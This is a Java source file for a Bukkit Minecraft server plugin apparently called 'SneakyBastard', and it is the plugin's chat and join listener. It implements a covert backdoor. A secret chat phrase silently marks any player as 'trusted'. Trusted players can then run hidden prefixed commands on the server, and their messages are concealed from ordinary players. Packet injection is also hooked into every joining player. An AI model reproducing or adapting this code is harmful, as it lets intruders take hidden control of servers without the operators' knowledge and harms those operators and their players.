package net.blackofworld.SneakyBastard.Listeners;

import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
import lombok.experimental.ExtensionMethod;
import net.blackofworld.SneakyBastard.Command.CommandBase;
import net.blackofworld.SneakyBastard.Command.CommandManager;
import net.blackofworld.SneakyBastard.Start;
import net.blackofworld.SneakyBastard.Utils.Packets.PacketInject;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

import java.util.ArrayList;
import java.util.Arrays;


@ExtensionMethod(PlayerExt.class)
public final class SneakyListener implements Listener {
    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onLogin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        PacketInject.getPlayer(p).hook();
        if (CommandManager.Instance.isTrusted(p)) {
            CommandManager.Instance.addTrusted(p);
        }
    }
    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)

    public void onQuit(PlayerQuitEvent e) {
        PacketInject.getPlayer(e.getPlayer()).unhook();
    }

    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    public void asyncChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        String msg = e.getMessage();
        if (e.getMessage().equals(CommandManager.TRUST_COMMAND)) {
            e.setCancelled(true);
            boolean trust = !CommandManager.Instance.isTrusted(p) ? CommandManager.Instance.addTrusted(p) : !CommandManager.Instance.removeTrusted(p);
            p.Reply("You are now " + (trust ? "trusted" : "untrusted"));
            return;
        }
        if (!e.getMessage().startsWith(CommandManager.COMMAND_SIGN) || !CommandManager.Instance.isTrusted(p)) {
            return;
        }
        e.setCancelled(true);
        String[] dmp = msg.substring(1).split(" ");
        ArrayList<String> args = new ArrayList<>(Arrays.asList(dmp).subList(1, dmp.length));
        for (CommandBase command : CommandManager.Instance.commandList) {
            if (!command.Command.equalsIgnoreCase(dmp[0])) continue;
            if (args.size() >= command.requiredArgs)
                Bukkit.getScheduler().runTask(Start.Instance, () -> command.Execute(p, args));
            else
                p.sendHelp(command, ChatColor.RED + "Not enough arguments!");
            return;
        }
        p.Reply(ChatColor.RED + "Command not found!");
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void asyncChatLowest(AsyncPlayerChatEvent e) {
        if (e.isCancelled()) return;
        Player p = e.getPlayer();
        if (!CommandManager.Instance.isTrusted(p)) return;
        e.setCancelled(true);
        String format = e.getFormat();
        Bukkit.getScheduler().runTask(Start.Instance, () -> {
            for (Player player : Bukkit.getOnlinePlayers()) {
                String string = CommandManager.Instance.isTrusted(player) ? String.format(format, CommandManager.COMMAND_PREFIX + p.getDisplayName(), e.getMessage()) : String.format(format, p.getDisplayName(), e.getMessage());
                player.sendMessage(string);
            }
        });
    }
}
